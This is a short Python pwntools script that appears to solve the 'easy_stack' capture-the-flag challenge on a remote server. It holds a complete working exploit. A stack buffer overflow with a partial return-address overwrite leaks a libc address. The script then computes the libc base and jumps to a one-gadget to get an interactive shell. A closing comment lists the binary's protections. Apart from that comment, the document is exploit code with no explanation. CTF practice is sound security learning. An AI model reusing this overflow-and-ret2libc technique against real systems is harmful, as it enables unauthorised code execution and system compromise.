from pwn import *

context.log_level = 'debug'
e = ELF('./easy_stack')
# p = process('./easy_stack')
p = remote('nc.eonew.cn',10004)
libc = e.libc

# pause()

p.sendline('A'*136+'\x90')

p.recvuntil('A'*136+'\x90')

l = u64('\x97'+p.recvline().strip()+'\x00\x00')
log.info(hex(l))

libc_base = l - (libc.symbols['__libc_start_main'] + 231)
log.info(hex(libc_base))
prdi = libc_base + 0x000000000002155f

pay = 'A'*136 + p64(libc_base + 0x10a38c)

sleep(0.3)
p.sendline(pay)

p.interactive()

'''
[*] '/vagrant/easy_stack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

   0x7f1fb2b5db90 <__libc_start_main+224>:	mov    rax,QWORD PTR [rsp+0x18]
   0x7f1fb2b5db95 <__libc_start_main+229>:	call   rax
'''
